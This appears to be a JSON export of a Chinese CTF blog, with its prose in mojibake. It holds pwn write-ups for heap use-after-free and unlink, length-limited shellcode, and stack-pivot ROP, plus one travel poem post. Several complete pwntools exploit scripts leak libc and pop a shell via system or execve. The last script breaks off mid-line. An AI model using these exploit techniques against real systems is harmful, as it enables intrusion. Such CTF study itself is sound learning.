[{"title":"Heap1sEz - å †æ¼æ´çš„ç®€å•åˆ©ç”¨","url":"/categories/CTF/heap1sEz/","content":"å †çš„å†…éƒ¨ç»“æ„\n\nåœ¨ç¨‹åºçš„æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ç§°ç”± malloc ç”³è¯·çš„å†…å­˜ä¸º chunk\nã€‚è¿™å—å†…å­˜åœ¨ ptmalloc å†…éƒ¨ç”¨ malloc_chunk ç»“æ„ä½“æ¥è¡¨ç¤ºã€‚\n\n/*  This struct declaration is misleading (but accurate and necessary).  It declares a \"view\" into memory allowing access to necessary  fields at known offsets from a given base. See explanation below.*/struct malloc_chunk {  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */  struct malloc_chunk* fd;         /* double links -- used only if free. */  struct malloc_chunk* bk;  /* Only used for large blocks: pointer to next larger size.  */  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */  struct malloc_chunk* bk_nextsize;};\nå…³äºå †çš„ç»“æ„å¾ˆé‡è¦çš„ä¸€ç‚¹åœ¨äºï¼Œå…¶ä½¿ç”¨å’Œ free\nçŠ¶æ€ä¸‹çš„ç»“æ„ä¸€è‡´ï¼Œåªæ˜¯ç›¸åº”åŠŸèƒ½æœ‰åŒºåˆ«ã€‚ä¾‹å¦‚ä½¿ç”¨æ—¶ fd\næ®µç”¨äºå­˜å‚¨æ•°æ®ï¼Œå¯ä»¥é€šè¿‡æŸäº›æ–¹æ³•æŠŠä¸åˆæ³•çš„æ•°æ®å†™å…¥ä¸€ä¸ª free chunk çš„ fd\nä¸­ã€‚ \nç¨‹åºåˆ†æ\nchecksec\n\nç¨‹åºå¼€å¯äº† PIE ä¿æŠ¤\nç¨‹åºè¿è¡Œ\n\næºç åˆ†æ\nç¨‹åºä¸»è¦ç”± gift , add , edit ,\nshow , delete å‡ ä¸ªå‡½æ•°æ„æˆã€‚å…¶ä¸­\ngift å‡½æ•°ç›´æ¥è®©æˆ‘ä»¬å¯ä»¥è¿›è¡Œ __free_hook\nåŠ«æŒã€‚\nvoid gift(){    printf(\"give me a hook\\n\");    if (scanf(\"%p\", &amp;hook) &lt;= 0)        _exit(1);}\nå› æ­¤è€ƒè™‘é€šè¿‡ __free_hook åŠ«æŒæ‰§è¡Œ\nsystem('/bin/sh') å¾—åˆ° shellã€‚\nåœ¨ delete\nå‡½æ•°ä¸­ç»™å®šå†…å­˜å—è¢«é‡Šæ”¾ï¼Œä½†æ˜¯å¯¹åº”çš„æŒ‡é’ˆæ²¡æœ‰è¢«è®¾ç½®ä¸º NULLï¼Œå­˜åœ¨ Use After\nFree æ¼æ´ã€‚\nvoid delete() {    unsigned int index;    printf(\"Index: \");    scanf(\"%u\", &amp;index);    if (index &gt;= 16) {        printf(\"There are only 16 pages in this notebook.\\n\");        return;    }    if (notes[index] == NULL) {        printf(\"Page not found.\\n\");        return;    }    free(notes[index]); //æ²¡æœ‰ç½®ç©º    return;}\næ”»å‡»æµç¨‹\næ³„éœ²ç¨‹åºåŸºå€\nç”±äºç¨‹åºæ‰“å¼€äº†\nPIEï¼Œå¯¼è‡´ç¨‹åºè¿è¡Œæ—¶åŠ è½½åŸºå€ä¸ç¡®å®šã€‚ä½†æ˜¯ç”±äºç¨‹åºä¸­çš„åç§»ä»ç„¶ä¸å˜ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦æ³„éœ²ç¨‹åºä¸­\n.text , .data æˆ–è€… .bss ä¸­çš„åœ°å€æ¥è®¡ç®—ç¨‹åºåŸºå€ã€‚è¿™é‡Œé€‰æ‹©\nmain_arena è¿›è¡Œæ³„éœ²ï¼Œå› ä¸ºé€šè¿‡ Unsorted Bin\nçš„æœºåˆ¶ä¼šå¾ˆå®¹æ˜“å¾—åˆ°ã€‚\nç”³è¯·ä¸¤ä¸ªå¤§å°ä¸º 8 çš„ chunkï¼Œåˆ†åˆ«ä¸º 1ã€2ï¼Œ ç„¶åé‡Šæ”¾åæ”¾å…¥ Unsorted\nBinã€‚è¿™é‡Œ chunk1 çš„ fd å°±ä¼šæŒ‡å‘æŸä¸ªä¸ main_arena\næœ‰å…³çš„åœ°å€ã€‚ç»è¿‡åŠ¨æ€è°ƒè¯•å¾—çŸ¥ï¼Œ å®ƒæŒ‡å‘\n&amp;main_arena - 0x08ã€‚\nä¸è¿‡ç›®å‰æˆ‘è¿˜ä¸æ˜ç™½ï¼Œä¸ºä»€ä¹ˆåªæœ‰ä¸€ä¸ª chunk\nçš„æ—¶å€™æ— æ³•æ³„éœ²å‡ºåœ°å€ï¼Œå¯èƒ½æ˜¯åªæœ‰ä¸€ä¸ª chunk çš„æ—¶å€™åªéœ€è¦åœ¨\nmain_arena.bins ä¸­å­˜å‚¨ç›¸å…³æŒ‡é’ˆå³å¯ã€‚\næ³„éœ² libc åŸºå€\nå¾—åˆ°ç¨‹åºåŸºå€åï¼Œä¸ºäº†å¾—åˆ° system å‡½æ•°çš„åœ°å€ï¼Œè¿˜éœ€è¦è·å¾—\nlibc åŸºå€ã€‚è€Œç¨‹åºä¸­å”¯ä¸€å¯åˆ©ç”¨çš„è¾“å‡ºå‡½æ•°ä½äº show å‡½æ•°ä¸­\nvoid show() {    unsigned int index;    printf(\"Index: \");    scanf(\"%u\", &amp;index);    if (index &gt;= 16) {        printf(\"There are only 16 pages in this notebook.\\n\");        return;    }    if (notes[index] == NULL) {        printf(\"Page not found.\\n\");        return;    }    puts(notes[index]); //å¯ä»¥åˆ©ç”¨    return;}\næˆ‘ä»¬éœ€è¦å°è¯•å°† notes[index] ä¿®æ”¹ä¸ºä¸€ä¸ª got\nè¡¨ä¸­çš„å€¼ï¼Œä¾‹å¦‚ read@got[plt] ã€‚\nåˆ©ç”¨ unlink å®ç°ä»»æ„åœ°å€è¯»å†™\nunlink_chunk (mchunkptr p){  if (chunksize (p) != prev_size (next_chunk (p)))    malloc_printerr (\"corrupted size vs. prev_size\");  mchunkptr fd = p-&gt;fd;                                                   mchunkptr bk = p-&gt;bk;  //if (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0))    //malloc_printerr (\"corrupted double-linked list\");  fd-&gt;bk = bk;  bk-&gt;fd = fd;}\n\n\nFD=P-&gt;fd = target addr - 0x18\nBK=P-&gt;bk = expect value\nFD-&gt;bk = BKï¼Œå³ *(target addr- 0x18+ 0x18)=BK=expect value\nBK-&gt;fd = FDï¼Œå³ *(expect value +0x10) = FD = target addr-\n0x18\n\n\nåœ¨ 64 ä½ç¨‹åºé‡Œï¼Œchunk æ¯ä¸ªå­—æ®µå  8 ä¸ªå­—èŠ‚ã€‚\nç”±äºç¨‹åºä¸­å­˜åœ¨ UAF æ¼æ´ï¼Œåªéœ€è¦ç”³è¯·ä¸¤ä¸ª\nchunkï¼Œå¤§å°ä¸º 16ï¼ˆæˆ–è€…æ›´å¤§ï¼‰ã€‚åˆ é™¤ chunk1 åç¼–è¾‘\nchunk1 è¦†ç›– fd, bk çš„å€¼ï¼Œéšååˆ é™¤ chunk2ã€‚æ­¤æ—¶ä¼šå‘ç”Ÿå‰å‘åˆå¹¶ï¼Œæ‰§è¡Œ\nunlink ç›¸å…³ä»£ç ã€‚\nä¸è¿‡è¿™é‡Œåœ¨æµ‹è¯•æ—¶å‘ç”Ÿäº†æ®µé”™è¯¯ï¼Œå¦‚ä¸‹å›¾ï¼š\n\nåæ¥å‘ç°æ˜¯å› ä¸º got è¡¨ä¸­\n&lt;read@got[plt]+0x10&gt; çš„å€¼è¢«ä¿®æ”¹äº†ï¼Œè€Œè¿™ä¸ªä½ç½®æ°å¥½å­˜å‚¨\n__printf_chk\nå‡½æ•°çš„åœ°å€ï¼Œå¯¼è‡´ç¨‹åºæ„å¤–è·³è½¬åˆ°äº†ä¸€ä¸ªä¸å¯æ‰§è¡Œçš„ä½ç½®ã€‚æ‰€ä»¥å°è¯•æ³„éœ²å…¶ä»– libc å‡½æ•°çš„åœ°å€ï¼Œå¹¶ä¸”åœ¨å®ƒå 0x10 å¤„çš„å‡½æ•°ä¸ä¼šåœ¨åé¢çš„æ”»å‡»è¿‡ç¨‹ä¸­æ‰§è¡Œã€‚\n\n\n.got\n\næ‰§è¡Œ system('/bin/sh')\nä¼ å‚\nè§‚å¯Ÿ __free_hook ç›¸å…³çš„ä»£ç ï¼Œå¯ä»¥å‘ç°\nvoid delete() {    //...    free(notes[index]);    return;}void free(void *mem){  mchunkptr p;                 /* chunk corresponding to mem */  INTERNAL_SIZE_T size;        /* its size */  mchunkptr nextchunk;         /* next contiguous chunk */  INTERNAL_SIZE_T nextsize;    /* its size */  int nextinuse;               /* true if nextchunk is used */  INTERNAL_SIZE_T prevsize;    /* size of previous contiguous chunk */  mchunkptr bck;               /* misc temp for linking */  mchunkptr fwd;               /* misc temp for linking */  if (__builtin_expect (hook != NULL, 0))  {    (*hook)(mem);    return;  }    //...\nåªéœ€è¦å°† mem å¯¹åº”çš„ä½ç½®ä¿®æ”¹ä¸º '/bin/sh'\nå³å¯ï¼Œè€Œä½¿ç”¨ç¨‹åºä¸­è‡ªå¸¦çš„ edit åŠŸèƒ½å°±èƒ½å®ç°ã€‚\n__free_hook åŠ«æŒ\nè¿™é¢˜ç›´æ¥æä¾›äº†åé—¨å‡½æ•° gift ç”¨äºä¿®æ”¹\n&amp;hook ä¸Šçš„å€¼ã€‚\nexp\nfrom pwn import *context.log_level = \"debug\"context.arch = \"amd64\" libc = ELF(\"./libc.so.6\")p = process(\"./vuln\")#p = remote(\"182.202.178.28\",31639)#gdb.attach(p)def add(index,size):    p.sendline(b\"1\")    p.sendlineafter(\"Index:\",str(index))    p.sendlineafter(\"Size: \",str(size))def dele(index):    p.sendline(b\"2\")    p.sendlineafter(\"Index:\",str(index))def edit(index,content):    p.sendline(b\"3\")    p.sendlineafter(\"Index:\",str(index))        p.sendlineafter(\"Content: \",content)def show(index):    p.sendline(b\"4\")    p.sendlineafter(\"Index:\",str(index))add(2,8)add(3,8)dele(2)dele(3)show(2)bss_addr = u64(p.recvuntil('\\x0a\\x77\\x65',drop=True)[-6:].ljust(8, b'\\x00'))elfbase = bss_addr + 0x8 - 0x3810print(\"bss:\",hex(bss_addr))note = elfbase + 0x3880puts = elfbase + 0x3768add(0,16)add(1,16)dele(0)edit(0,p64(note-0x18)+p64(puts))dele(1)show(0)puts_addr = u64(p.recvuntil('\\x0a\\x77\\x65',drop=True)[-6:].ljust(8, b'\\x00'))libc_base = puts_addr - libc.sym[\"puts\"]sys_addr = libc_base + libc.sym[\"system\"]add(6,8)edit(6,b\"/bin/sh\")p.sendline(b\"6\")p.sendlineafter(b\"give me a hook\\n\",hex(sys_addr))dele(6)p.interactive()\n","categories":["CTF"],"tags":["pwn","heap","unlink","UAF"]},{"title":"shellcode - æœ‰é•¿åº¦é™åˆ¶çš„ shellcode è§£æ³•","url":"/categories/CTF/241103-shellcode/","content":"shellcode\n\nshellcode æ˜¯ä¸€æ®µç”¨äºåˆ©ç”¨è½¯ä»¶æ¼æ´è€Œæ‰§è¡Œçš„ä»£ç ï¼Œshellcode ä¸º 16\nè¿›åˆ¶ä¹‹æœºæ¢°ç ï¼Œä»¥å…¶ç»å¸¸è®©æ”»å‡»è€…è·å¾— shell è€Œå¾—åã€‚shellcode\nå¸¸å¸¸ä½¿ç”¨æœºå™¨è¯­è¨€ç¼–å†™ã€‚ \n\nç¨‹åºåˆ†æ\né¢˜ç›®æ¥æºï¼šç¬¬ä¸ƒå±Šæµ™æ±Ÿçœå¤§å­¦ç”Ÿç½‘ç»œä¸ä¿¡æ¯å®‰å…¨ç«èµ›é¢„èµ›\n\n\nimage-20241103161301251\n\nchecksec\n\n\nä¿æŠ¤å…¨å¼€\n\né€†å‘åˆ†æ\n\n\nIDA ä¼ªä»£ç \n\nç¨‹åºçš„åŠŸèƒ½å¾ˆç›´æ¥ï¼Œæ‰§è¡Œè¾“å…¥çš„ä¸€æ®µ shellcodeï¼Œä½†æ˜¯æœ‰\n0xa çš„é•¿åº¦é™åˆ¶ã€‚\nå¹¶ä¸”å­˜åœ¨ memmem å‡½æ•°ï¼Œæ£€æŸ¥è¾“å…¥çš„å†…å®¹ï¼Œä½¿ç”¨ IDA ç»§ç»­æŸ¥çœ‹\nunk_203D çš„å†…å®¹ï¼Œå‘ç°æ˜¯å‡ºé¢˜äººç¦æ­¢äº† syscall\nçš„æœºå™¨ç ã€‚\n\n\nsyscall('0f')\n\nåŠ¨æ€è°ƒè¯•\n\nåœ¨ç¨‹åºæ‰§è¡Œ shellcode ä¹‹åï¼Œè§‚å¯Ÿå¯„å­˜å™¨å’Œæ ˆçš„æƒ…å†µã€‚å½“æ—¶æ¯”èµ›æ—¶å‘ç°\nr8 ä¸­å­˜æœ‰ syscall\næŒ‡ä»¤çš„åœ°å€ï¼Œæˆ‘çš„ä¸€ä¸ªæƒ³æ³•æ˜¯æ§åˆ¶å¯„å­˜å™¨ rax, rdi,\nrsi, rdx æ‰§è¡Œç³»ç»Ÿè°ƒç”¨ readã€‚\nmov rsi,raxxor rax,raxxor rdi,rdiadd rdx,0x50call r8\nä¸è¿‡è¿™æ ·çš„é•¿åº¦å·²ç»è¶…å‡º 0xa çš„é™åˆ¶äº†ã€‚åé¢æˆ‘åˆæƒ³äº†å¾ˆä¹…ï¼Œæƒ³ç»§ç»­åˆ©ç”¨\nr8 è·³è½¬åˆ°æŸä¸ª main å‡½æ•°ä¸Šçš„æŒ‡ä»¤ï¼Œè°ƒè¯•å‘ç°ä»\nr8 åˆ°ä¸€ä¸ª main\nå‡½æ•°çš„åœ°å€éœ€è¦å‡å»ä¸‰ä½åå…­è¿›åˆ¶æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´æ“ä½œæ•°å æ®äº† shellcode ä¸­ 0x4\nçš„é•¿åº¦äº†ã€‚å“ï¼Œç»“æœæˆ‘å°±è¿™æ ·å¿½è§†äº† rsp ä¸Šçš„\n&lt;main+0132&gt;ï¼Œä¸€ç›´åˆ°æ¯”èµ›ç»“æŸã€‚\næ”»å‡»æµç¨‹\nè¿™é‡Œçš„æ€è·¯æ˜¯ç™½å¤œå­¦é•¿æä¾›çš„ã€‚\nè°ƒæ•´ä¼ å‚å¯„å­˜å™¨ï¼Œæ§åˆ¶ç¨‹åºæµç¨‹\nELF ä¸­çš„ read å‡½æ•°å‚æ•°å¦‚ä¸‹\n\næ ˆä¸­çš„æ•°æ®å¦‚ä¸‹\n\n\nç”±äºç¨‹åºä¸­ä½¿ç”¨ call\nrax æ‰§è¡Œ shellcodeï¼Œè¿”å›åœ°å€å­˜åœ¨æ ˆé¡¶\n\nç¬¬ä¸€æ®µ shellcode\npop rdx; è¿”å›åœ°å€å‡ºæ ˆpop rdi; fdpop rsi; å°†ä¸éœ€è¦çš„æ•°æ®å‡ºæ ˆpop rsi; *buf &lt;- shellcode addresssud rdx,0x41; å‡å»åç§»ï¼Œç»“æœä¸º &lt;main+00f1&gt;call rdx\nå°†ç¨‹åºè·³è½¬åˆ° main å‡½æ•°çš„ call _read å‰:\n\næ‰§è¡Œ shellcode\næ²¡æœ‰äº†è¯»å…¥é™åˆ¶åï¼Œç›´æ¥ä½¿ç”¨ pwntool ç”Ÿæˆçš„ shellcode å³å¯ã€‚\nExploit\nfrom pwn import *context.log_level = \"debug\"context.arch = \"amd64\"p = process(\"./shellcode1\")#p = remote(\"139.155.126.78\", \"38681\")shellcode = \"\"\"pop rdx;pop rdi;pop rsi;pop rsi;sub rdx, 0x41;call rdx;\"\"\"gdb.attach(p)p.sendafter(b\"input\", asm(shellcode))shellcode = \"\"\"nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;\"\"\" #10ä¸ªnopï¼Œå› ä¸ºä¸‹æ¬¡æ‰§è¡Œçš„åœ°å€æ˜¯åœ¨shellcode1çš„ç»“å°¾(call rdx)shellcode += shellcraft.sh()p.send(asm(shellcode))p.interactive()\nå°ç»“\nè¿™å›çš„çœèµ›å±äºæ˜¯åäº†å››å°æ—¶å¤§ç‰¢äº†ã€‚æ¯é“é¢˜ç›®æˆ–è€…æ˜¯åœ¨ç°å®å®è·µä¸­ï¼Œè‡ªç„¶æ˜¯ä¸ä¹‹å‰é‡åˆ°çš„æƒ…å†µä¼šæœ‰ä¸åŒã€‚å› æ­¤å¯¹ç¨‹åºåŠ¨æ€è¿è¡Œä¸­çš„å„ç§çŠ¶æ€åº”è¯¥æ•é”ä¸€äº›ï¼Œä¾‹å¦‚æ ˆã€å¯„å­˜å™¨ï¼Œå¯èƒ½ä¼šæœ‰å‘ç°ã€‚\n","categories":["CTF"],"tags":["pwn","shellcode"]},{"title":"é’±å¡˜æ±Ÿè¾¹","url":"/categories/%E6%97%A5%E5%B8%B8/20241106-daily/","content":"\nä¸€å¶èˆŸè½»ï¼ŒåŒæ¡¨é¸¿æƒŠã€‚æ°´å¤©æ¸…ã€å½±æ¹›æ³¢å¹³ã€‚é±¼ç¿»è—»é‰´ï¼Œé¹­ç‚¹çƒŸæ±€ã€‚è¿‡æ²™æºªæ€¥ï¼Œéœœæºªå†·ï¼Œæœˆæºªæ˜ã€‚\né‡é‡ä¼¼ç”»ï¼Œæ›²æ›²å¦‚å±ã€‚ç®—å½“å¹´ï¼Œè™šè€ä¸¥é™µã€‚å›è‡£ä¸€æ¢¦ï¼Œä»Šå¤ç©ºåã€‚ä½†è¿œå±±é•¿ï¼Œäº‘å±±ä¹±ï¼Œæ™“å±±é’ã€‚\nâ€”â€”ã€Šè¡Œé¦™å­ãƒ»è¿‡ä¸ƒé‡Œæ¿‘ã€‹ \n\n\n\næ‘„äº 2024/11/5 17:18 æ²¿æ±Ÿå¤§é“\n","categories":["æ—¥å¸¸"]},{"title":"DASCTF12 æœˆèµ›å¤ç°","url":"/categories/CTF/dasctf2025-12-wp/","content":"å‰è¨€\næœ¬æ¬¡ DASCTF\n12 æœˆèµ›å°è¯•äº† pwn æ–¹å‘çš„ä¸¤é“é¢˜ç›®ï¼Œæœ€ç»ˆè¿˜æ˜¯å¦‚æ„¿ä»¥å¿çš„çˆ†é›¶äº†ã€‚é¦–å…ˆçœ‹åˆ°é¢˜ç›®æˆ‘å°±æœ‰ç§é™Œç”Ÿçš„æ„Ÿè§‰ï¼Œç»™å®šç¨‹åºæ˜¯å»æ‰è°ƒè¯•ç¬¦å·çš„ï¼Œå¹¶ä¸”æœ‰å¤šä¸ªå‡½æ•°ï¼Œå¤§å¤§é™ä½äº†å¯è¯»æ€§ï¼Œå’Œæˆ‘å…ˆå‰é‡è§çš„é¢˜ç›®æœ‰ä¸å°çš„åŒºåˆ«ã€‚\n\nBaseMachine\nchecksec\n\n\nä¿æŠ¤å…¨å¼€\n\né€†å‘åˆ†æ\n\n\nmain\n\nè¯»å…¥ ./flag åä¼ å…¥\nsub_3990ï¼Œå›¾ä¸­çš„ä¹±ç æ˜¯è¡¨æƒ…ï¼Œæ˜¯ IDA çš„ç¼–ç é—®é¢˜ã€‚åé¢æ˜¯å¾ªç¯è¯»å…¥ç”¨æˆ·è¾“å…¥ï¼ŒåŒæ ·ä¼ å…¥\nsub_3990ã€‚\nè¿›å…¥ sub_3990 ç»§ç»­åˆ†æï¼š\n\n\nv9\n\næ ¹æ®ä¼ å…¥çš„å‚æ•° a1, a2\nå†³å®šç¨‹åºåç»­æµç¨‹ï¼Œå…·ä½“æ˜¯ç¼–ç ç±»å‹ (base64, base85...)ã€‚\næœ‰æ„æ€çš„æ˜¯ï¼Œç¨‹åºå°†å­—ç¬¦ä¸²çš„åŠ è§£å¯†æµç¨‹æ”¾åœ¨åœ¨ _data\nï¼Œå³æ•°æ®æ®µä¸­ã€‚\nv10 = ((__int64 (__fastcall *)(char *, const char *))*(&amp;off_7260 + v8))(s, a3);\n.data:0000000000007260 off_7260        dq offset sub_1D6A      ; DATA XREF: sub_3990+155â†‘o.data:0000000000007260                                         ; sub_3990+1C8â†‘o.data:0000000000007268                 dq offset sub_1ED6.data:0000000000007270                 dq offset sub_22B2.data:0000000000007278                 dq offset sub_27D4.data:0000000000007280                 dq offset sub_2B94.data:0000000000007288                 dq offset sub_2E17.data:0000000000007290                 dq offset sub_3498.data:0000000000007290 _data           ends.data:0000000000007290\nè¿™æ¶‰åŠåˆ° C è¯­è¨€ä¸­å‡½æ•°æŒ‡é’ˆçš„æ¦‚å¿µ:\nå‡½æ•°æŒ‡é’ˆæ˜¯ä¸€ä¸ªæŒ‡å‘å‡½æ•°çš„æŒ‡é’ˆå˜é‡ï¼Œå¦‚ï¼š\nint (*p)(int x, int  y);\nå…·æœ‰ä¸¤ä¸ªæ•´å‹å‚æ•°ï¼Œè¿”å›å€¼æ˜¯æ•´å‹ã€‚\nå¦‚ä¸‹ä»£ç å®ç°äº†é€šè¿‡å‡½æ•°æŒ‡é’ˆè°ƒç”¨å‡½æ•°ï¼š\nint maxValue (int a, int b) {    return a &gt; b ? a : b;}int (*p)(int, int) = NULL;p = maxValue;p(1, 2);\nè€Œé¢˜ç›®ç¨‹åºä¸­å°±æ˜¯é€šè¿‡ç±»ä¼¼è¿™æ ·çš„å‡½æ•°æŒ‡é’ˆæ•°ç»„å®ç°çš„ã€‚\næ¥ç€ï¼Œæ ¹æ®ä¸ unk_73C0 ä¸­çš„æ•°æ®æ¯”è¾ƒè¿™ä¸€åŠŸèƒ½å¯ä»¥ï¼ˆåº”è¯¥ï¼Ÿï¼‰æ¨æµ‹æ˜¯åœ¨è®¡ç®—å“ˆå¸Œ\n\n\nwp ä¸­æŒ‡å‡ºè¿™æ˜¯åœ¨è®¡ç®— SHA256\n\nå¦‚æœæ²¡æœ‰æ‰¾åˆ°ç›¸åŒçš„ï¼Œå°±ä½¿ç”¨æ–°çš„æ§½ä½ï¼š\n\n\né€‰æ‹©æœ€å…ˆæˆ–æœªä½¿ç”¨çš„æ§½ä½ï¼Œè¦†ç›–è¯¥æ§½ä½å­˜å‚¨çš„æ•°æ®\n\nå­˜ã€è¯»å–å“ˆå¸Œå’Œå¯†æ–‡éƒ¨åˆ†ï¼š\n\nè§£å¯†ã€è¾“å‡ºéƒ¨åˆ†ï¼š\n\n\næ˜¯å¦è¾“å‡ºç”±ä¼ å…¥å‚æ•° a4 å†³å®š\n\nVulnerabilities\nä¸ unk_73C0 è¯»å†™æœ‰å…³çš„å‡½æ•° sub_37A4\nä¸­å­˜åœ¨æº¢å‡ºæ¼æ´\n\n\næ•°ç»„åªèƒ½å‚¨å­˜ 0-5\n\n\n\nunk_73c0 å°†ç¼–ç ç±»å‹å’Œæ˜æ–‡å†™å…¥å¯¹åº”ä½ç½®\n\næ”»å‡»æµç¨‹\nä»¥ä¸‹ä¸ºå®˜æ–¹ wp æ€è·¯ã€‚\nå¯»æ‰¾å…·æœ‰ 'b85' å¼€å¤´ SHA256 å€¼çš„å­—ç¬¦ä¸²ï¼Œå°† flag æ§½ä½ä¸Šçš„å“ˆå¸Œä¿®æ”¹ä¸ºè¿™ä¸ªå€¼ã€‚å…·ä½“å®ç°å¦‚ä¸‹ï¼ˆæ¥è‡ªå®˜æ–¹ wpï¼‰ï¼š\n#!/usr/bin/env python3from pwncli import *context.terminal = [\"tmux\", \"splitw\", \"-h\", \"-l\", \"122\"]local_flag = sys.argv[1] if len(sys.argv) == 2 else 0if local_flag == \"remote\":    addr = ''    host = addr.split(' ')    gift.io = remote(host[0], host[1])    gift.remote = Trueelse:    gift.io = process('./BaseMachine')    if local_flag == \"nodbg\":        gift.remote = Trueinit_x64_context(gift.io, gift)libc = load_libc()gift.elf = ELF('./BaseMachine')cmd = '''    c'''for i in range(3):    sla(\"ğŸ« ğŸ« ğŸ« \", 'plain b64 ' + str(i))launch_gdb(cmd)sla(\"ğŸ« ğŸ« ğŸ« \", b'plain b85 ' + b'aaaa' * 10 + b'a')ru(\"ğŸ˜ğŸ˜ğŸ˜ \")data = ru(b'\\n', drop=True)pad1 = data[0:5]pad2 = data[-5:]# Match found! String: 6eU, SHA-256: b8509ba8fe72a1a7755d30eb9f16d4337774beab47a9d59d51a659c8ea8ce888for i in range(1, 8):    sla(\"ğŸ« ğŸ« ğŸ« \", b'b85 plain ' + b'09ba8fe72a1a7755d30eb9f16d4337774beab47a9d59d51a659c8ea8ce888aaaa' + pad1 * i + pad2 + pad1 * (10 - i))sla(\"ğŸ« ğŸ« ğŸ« \", b'plain b64 6eU')ru(\"ğŸ˜ğŸ˜ğŸ˜ \")flag = ru(b'\\n', drop=True)sla(\"ğŸ« ğŸ« ğŸ« \", b'b64 plain ' + flag)ia()\næ€»ç»“\nè¿™é¢˜çš„ä½œè€…å¯è§å¯¹ç¼–ç éå¸¸ç†Ÿæ‚‰ï¼Œç›®å‰æˆ‘è¿˜æ²¡æœ‰å¯¹ base ç³»åˆ—æœ‰ä¸€ä¸ªå¤ªæ¸…æ™°çš„äº†è§£ã€‚æœ€å¤šçŸ¥é“å®ƒå¤§æ¦‚çš„åŸç†ï¼Œæˆ–è€…ä»¿å†™åŠ è§£å¯†çš„ä»£ç ä¹‹ç±»çš„ã€‚ä»¥åæœ‰ç©ºæˆ‘ä¼šå°è¯•æ‰‹æ“ä¸€ä¸‹å„ç§ base çš„åŠ è§£å¯†çš„ï¼ˆä¹‹å‰æ¥è§¦ base æ˜¯ hgame-mini\n2024 ä¸Šçš„ä¸€é“é€†å‘é¢˜ â€”â€”base emojiï¼‰ã€‚å¦å¤–å¯¹ä»£ç çš„é˜…è¯»èƒ½åŠ›ä¹Ÿæœ‰å¾…æå‡ã€‚\n","categories":["CTF"],"tags":["pwn","ä»£ç å®¡è®¡","å‡½æ•°æŒ‡é’ˆ"]},{"title":"HGAME 2025 Week 1 Writeup","url":"/categories/CTF/hgame-2025-week1-wp/","content":"counting petals\nVulnerabilities\n\nå­˜åœ¨è¶Šç•Œå†™å…¥æ¼æ´ã€‚ \n\nå­˜åœ¨ä»»æ„è¯»æ¼æ´ã€‚\n\nExploit\nè§‚å¯Ÿæ ˆç»“æ„ï¼Œæ„é€ æ•°æ®ä½¿ v9=16 æ—¶ä»¤ v8,\nv9 ä¸ºä¸åˆæ³•çš„å€¼ï¼Œä»è€Œæ³„éœ²æ ˆä¸Šçš„ libc åœ°å€ã€‚\nç¬¬äºŒæ¬¡å¾ªç¯æ—¶åˆ©ç”¨ä»»æ„å†™ï¼Œæ„é€  ROP é“¾ã€‚\nfrom pwn import *context.log_level = \"debug\"p = remote(\"node2.hgame.vidar.club\",32442)libc = ELF(\"./libc.so.6\")e = ELF(\"./vuln\")pop_rdi_off = 0x2a3e5pop_rsi_off = 0x2be51pop_rdx_r12_off= 0x11f2e7p.sendlineafter(\"How many flowers have you prepared this time?\",\"16\")for i in range(15):    p.sendlineafter(\"the flower number\",str(0))p.sendlineafter(\"the flower number\",str(0x1400000013))p.sendlineafter(\"latter:\",str(1))p.recvuntil(b\"+ 1 + \")number = p.recvuntil(b\" +\", drop=True)number = number.decode().strip()libc_address = int(number)log.info(hex(libc_address))libc_base = libc_address - 0x29D90log.info(hex(libc_base))sys_addr = libc_base + libc.sym[\"execve\"]binsh_addr = libc_base + next(libc.search(b\"/bin/sh\"))pop_rdi = libc_base + pop_rdi_offpop_rsi = libc_base + pop_rsi_offpop_rdx_r12 = libc_base + pop_rdx_r12_offp.sendlineafter(\"How many flowers have you prepared this time?\",\"16\")pause()for i in range(15):    p.sendlineafter(\"the flower number\",str(0))p.sendlineafter(\"the flower number\",str(0x120000001a))p.sendlineafter(\"the flower number\",str(pop_rdi)) p.sendlineafter(\"the flower number\",str(binsh_addr))p.sendlineafter(\"the flower number\",str(pop_rsi))p.sendlineafter(\"the flower number\",str(0))p.sendlineafter(\"the flower number\",str(pop_rdx_r12))p.sendlineafter(\"the flower number\",str(0))p.sendlineafter(\"the flower number\",str(binsh_addr))p.sendlineafter(\"the flower number\",str(sys_addr)) p.sendlineafter(\"latter:\",str(1))p.interactive()\nezstack\næ ¹æ®é¢˜ç›®æ‰€ç»™çš„ Dockerfile è·å–è¿œç¨‹ç¯å¢ƒç›¸åº”çš„ libc:\ndocker build -t pwn:v1 .\n\nç¦ç”¨ execve\nVulnerabilities\n\nå­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ã€‚\n\nå¯ä»¥ä¿®æ”¹ rbp è¿›è¡Œæ ˆè¿ç§»ã€‚\n\næœ‰å¤§æ®µçš„å¯å†™å¯è¯»æ®µã€‚\nExploit\næ ˆè¿ç§»åˆ°æ°å½“ä½ç½®ï¼Œä»¤ fd=4\næ³„éœ² libc åœ°å€ï¼Œå¹¶è°ƒæ•´ç¨‹åºè¯»å…¥çš„é•¿åº¦ï¼Œæ–¹ä¾¿åç»­å­˜æ”¾ ROP é“¾ã€‚\nfrom pwn import *context.log_level =\"debug\"p = remote(\"node1.hgame.vidar.club\",32351)e = ELF(\"./vuln\")libc = ELF(\"./libc-2.31.so\")write_plt = e.plt['write']write_got = e.got['write']writable_addr = 0x404154read_ret = 0x40140fpop_rdi = 0x401713pop_rsi_r15 = 0x401711leave_ret = 0x401425print(\"plt:\",hex(write_plt))print(\"got:\",hex(write_got))pause()payload = b'a' * 80 + p64(writable_addr) + p64(read_ret)p.sendafter(\"Good luck.\",payload)pause()payload = flat({    0x00: [        p64(writable_addr),        p64(pop_rdi),        p64(0x4),        p64(pop_rsi_r15),        p64(write_got),p64(0),        p64(write_plt), #write(4,&lt;write@got&gt;)        p64(read_ret),        p64(leave_ret),    ],    0x50: [        p64(writable_addr-0x50),        p64(leave_ret),    ]})p.send(payload)write_address = u64(p.recvuntil('\\x00\\x00',drop=True)[-6:].ljust(8, b'\\x00'))libc_base = write_address - 0x10e280log.info(hex(libc_base))pop_rdx_r12 = libc_base + 